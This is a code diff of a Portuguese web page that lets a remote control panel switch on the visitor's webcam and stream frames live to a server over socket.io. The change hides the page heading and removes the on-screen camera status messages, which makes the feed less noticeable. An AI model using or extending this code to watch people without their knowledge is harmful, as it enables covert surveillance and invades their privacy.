@@ -3,69 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <title>Dispositivo</title>
+    <style>
+        #video {
+            width: 320px;
+            height: 240px;
+            border: 1px solid #ccc;
+        }
+    </style>
 </head>
 <body>
-    <h2>Dispositivo</h2>
-    <video id="video" autoplay muted style="width: 320px; border: 1px solid #ccc;"></video>
+    <h2 style="display:none;">Dispositivo</h2>
+    <video id="video" autoplay muted></video>
     <p id="status"></p>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
         const video = document.getElementById('video');
-        const status = document.getElementById('status');
-
         let stream = null;
-        let mediaRecorder = null;
-        let gravaçãoChunks = [];
+        let isSendingFrames = false;
+        let canvas = document.createElement('canvas');
+        let ctx = canvas.getContext('2d');
 
+        // Função para enviar frames da câmera
+        function sendCameraFrame() {
+            if (!isSendingFrames || !stream) return;
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Converte para JPEG (otimizado para transmissão)
+            const frame = canvas.toDataURL('image/jpeg', 0.7); // Qualidade 70%
+            socket.emit('frame_ao_vivo', frame);
+
+            // Configura o próximo frame (~30 FPS)
+            setTimeout(sendCameraFrame, 33); // ~33ms = 30 FPS
+        }
+
+        // Recebe comandos do Painel
         socket.on('executar_comando', async (cmd) => {
-            if (cmd === 'ativar_camera') {
-                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                video.srcObject = stream;
-                status.textContent = 'Câmera ativada';
-            }
-
-            if (cmd === 'desativar_camera') {
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                    video.srcObject = null;
-                    stream = null;
-                }
-                status.textContent = 'Câmera desativada';
-            }
-
-            if (cmd === 'gravar_video') {
-                if (!stream) {
-                    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            if (cmd === 'ativar_camera' && !stream) {
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                     video.srcObject = stream;
+                    isSendingFrames = true;
+                    sendCameraFrame(); // Inicia o streaming
+                } catch (err) {
+                    console.error("Erro ao acessar câmera:", err);
                 }
+            }
 
-                gravaçãoChunks = [];
-                mediaRecorder = new MediaRecorder(stream);
-
-                mediaRecorder.ondataavailable = (e) => {
-                    if (e.data.size > 0) gravaçãoChunks.push(e.data);
-                };
-
-                mediaRecorder.onstop = () => {
-                    const blob = new Blob(gravaçãoChunks, { type: 'video/webm' });
-                    const reader = new FileReader();
-                    reader.onloadend = () => {
-                        socket.emit('video_gravado', reader.result);
-                        status.textContent = 'Vídeo enviado ao painel';
-                    };
-                    reader.readAsDataURL(blob);
-                };
-
-                mediaRecorder.start();
-                status.textContent = 'Gravando por 10 segundos...';
-
-                setTimeout(() => {
-                    if (mediaRecorder && mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                    }
-                }, 10000);
+            if (cmd === 'desativar_camera' && stream) {
+                isSendingFrames = false;
+                stream.getTracks().forEach(track => track.stop());
+                video.srcObject = null;
+                stream = null;
             }
         });
     </script>
